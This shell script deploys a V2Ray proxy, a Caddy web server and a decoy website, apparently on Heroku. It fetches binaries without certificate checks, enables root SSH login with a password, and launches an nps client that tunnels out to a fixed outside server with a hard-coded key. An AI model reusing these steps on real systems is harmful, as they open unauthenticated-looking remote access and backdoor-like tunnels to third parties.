#! /bin/bash
if [[ -z "${UUID}" ]]; then
  UUID="4890bd47-5180-4b1c-9a5d-3ef686543112"
fi

if [[ -z "${AlterID}" ]]; then
  AlterID="10"
fi

if [[ -z "${V2_Path}" ]]; then
  V2_Path="/FreeApp"
fi

if [[ -z "${V2_QR_Path}" ]]; then
  V2_QR_Code="1234"
fi

rm -rf /etc/localtime
ln -sf /usr/share/zoneinfo/Asia/Taipei /etc/localtime
date -R

SYS_Bit="$(getconf LONG_BIT)"
[[ "$SYS_Bit" == '32' ]] && BitVer='_linux_386.tar.gz'
[[ "$SYS_Bit" == '64' ]] && BitVer='_linux_amd64.tar.gz'

if [ "$VER" = "latest" ]; then
  V_VER=`wget -qO- "https://api.github.com/repos/v2ray/v2ray-core/releases/latest" | grep 'tag_name' | cut -d\" -f4`
else
  V_VER="v$VER"
fi

mkdir /v2raybin
cd /v2raybin
wget --no-check-certificate -qO 'v2ray.zip' "https://github.com/v2ray/v2ray-core/releases/download/$V_VER/v2ray-linux-$SYS_Bit.zip"
unzip v2ray.zip
rm -rf v2ray.zip
chmod +x /v2raybin/v2ray-$V_VER-linux-$SYS_Bit/*

C_VER=`wget -qO- "https://api.github.com/repos/mholt/caddy/releases/latest" | grep 'tag_name' | cut -d\" -f4`
mkdir /caddybin
cd /caddybin
wget --no-check-certificate -qO 'caddy.tar.gz' "https://github.com/mholt/caddy/releases/download/$C_VER/caddy_$C_VER$BitVer"
tar xvf caddy.tar.gz
rm -rf caddy.tar.gz
chmod +x caddy
cd /root
mkdir /wwwroot
cd /wwwroot

wget --no-check-certificate -qO 'demo.tar.gz' "https://github.com/dylanbai8/V2Ray_h2-tls_Website_onekey/raw/master/V2rayWebsite.tar.gz"
tar xvf demo.tar.gz
rm -rf demo.tar.gz

cat <<-EOF > /v2raybin/v2ray-$V_VER-linux-$SYS_Bit/config.json
{
  "reverse": {
    "portals": [
      {
        "tag": "portal",
        "domain": "abc.iw.mk"
      }
    ]
  },
  "inbounds": [
    {
      "tag": "portalin",
      "port": 998,
      "protocol": "vmess",
      "settings": {
        "clients": [
          {
            "id": "89682891-3d57-4cef-abbb-fbac5937ba29",
            "alterId": 64
          }
        ]
      },
      "streamSettings": {
        "network": "ws",
        "wsSettings": {
          "path": "/portalin",
          "headers": {
            "Host": "${AppName}.herokuapp.com"
          }
        }
      }
    },
     {
      "port": 999,
      "protocol": "vmess",
      "settings": {
        "clients": [
          {
            "id": "${UUID}",
            "alterId": ${AlterID}
          }
        ]
      },
      "tag": "interconn",
      "streamSettings": {
        "network": "ws",
        "security": "none",
        "wsSettings": {
          "path": "/img"
        }
      }
    }
  ],
  "outbounds": [
    {
      "tag": "crossfire",
      "protocol": "freedom"
    }
  ],
  "routing": {
    "rules": [
      {
        "type": "field",
        "inboundTag": [
          "portalin"
        ],
        "ip": "10.0.0.1",
        "port": "5001-5100",
        "outboundTag": "portal"
      },
      {
        "type": "field",
        "inboundTag": [
          "interconn"
        ],
        "outboundTag": "portal"
      },
      {
        "type": "field",
        "inboundTag": [
          "portalin"
        ],
        "outboundTag": "crossfire"
      }
    ]
  }
}
EOF

cat <<-EOF > /caddybin/Caddyfile
:${PORT} {
		root /wwwroot
		index index.html
    tls dspdop@gmail.com
    proxy /ssh 127.0.0.1:4200 {
        websocket
        header_upstream -Origin
    }
    proxy /img 127.0.0.1:999 {
        websocket
        header_upstream -Origin
    }
    proxy /portalin 127.0.0.1:998 {
        websocket
        header_upstream -Origin
    }
    proxy /a 10.0.0.1:5001 {
        websocket
        header_upstream -Origin
    }
    proxy /b 10.0.0.1:5002 {
        websocket
        header_upstream -Origin
    }
    proxy /c 10.0.0.1:5003 {
        websocket
        header_upstream -Origin
    }
}
EOF

cat <<-EOF > /v2raybin/vmess.txt
{
    "v": "2",
    "ps": "${AppName}.herokuapp.com",
    "add": "${AppName}.herokuapp.com",
    "port": "443",
    "id": "${UUID}",
    "aid": "${AlterID}",
    "net": "ws",
    "type": "none",
    "host": "",
    "path": "${V2_Path}",
    "tls": "tls"
}
EOF
sed -i 's/^#\?PermitRootLogin.*/PermitRootLogin yes/g' /etc/ssh/sshd_config;
sed -i 's/^#\?PasswordAuthentication.*/PasswordAuthentication yes/g' /etc/ssh/sshd_config;
echo "root:${password}" | chpasswd root
/etc/init.d/ssh restart
rm -rf /var/lib/apt/lists/*
cd /v2raybin/v2ray-$V_VER-linux-$SYS_Bit
./v2ray &
cd /caddybin
./caddy -conf="Caddyfile" &
cd /
mkdir npc && cd npc && wget https://github.com/cnlh/nps/releases/download/V0.23.2/linux_amd64_client.tar.gz &&tar -zxvf linux_amd64_client.tar.gz 
./npc -server=h.iw.mk:3306 -vkey=0jdwy86vn24plx5e -type=tcp &
